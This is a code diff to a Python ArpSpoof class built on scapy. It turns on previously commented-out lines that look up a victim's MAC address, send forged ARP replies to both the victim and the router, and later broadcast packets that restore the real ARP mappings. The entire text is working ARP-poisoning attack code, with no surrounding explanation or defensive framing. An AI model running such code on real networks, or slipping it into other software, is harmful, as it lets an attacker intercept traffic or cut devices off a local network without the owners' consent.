@@ -55,10 +55,9 @@ class ArpSpoof(object):
 
     def MACsnag(self, victimIP):
         try:
-            # ans = arping(victimIP, iface=self._interface, verbose=False)[0]
-            # if not ans:
-            #     return None
-            ans, unans = arping(victimIP+"/24")
+            ans = arping(victimIP, iface=self._interface, verbose=False)[0]
+            if not ans:
+                return None
 
             for s, r in ans:
                 return r[Ether].src
@@ -89,11 +88,10 @@ class ArpSpoof(object):
         _LOGGER.debug("Spoofing IP: %s MAC: %s", victimIP, victimMAC)
 
         try:
-            # send(ARP(op=2, pdst=victimIP, psrc=self._router_ip,
-            #          hwdst=victimMAC))
-            # send(ARP(op=2, pdst=self._router_ip, psrc=victimIP,
-            #          hwdst=self._router_mac))
-            return True
+            send(ARP(op=2, pdst=victimIP, psrc=self._router_ip,
+                     hwdst=victimMAC))
+            send(ARP(op=2, pdst=self._router_ip, psrc=victimIP,
+                     hwdst=self._router_mac))
         except:
             _LOGGER.error("Error when trying to spoof IP: %s",
                           self._devices[0][i])
@@ -106,10 +104,10 @@ class ArpSpoof(object):
             self._devices[0].remove(victimIP)
             self._devices[1].remove(victimMAC)
 
-            # send(ARP(op=2, pdst=self._router_ip, psrc=victimIP,
-            #          hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
-            # send(ARP(op=2, pdst=victimIP, psrc=self._router_ip,
-            # hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self._router_mac), count=4)
+            send(ARP(op=2, pdst=self._router_ip, psrc=victimIP,
+                     hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
+            send(ARP(op=2, pdst=victimIP, psrc=self._router_ip,
+            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self._router_mac), count=4)
         except:
             _LOGGER.error("Error when restoring IP: %s",
                           self._devices[0][i])
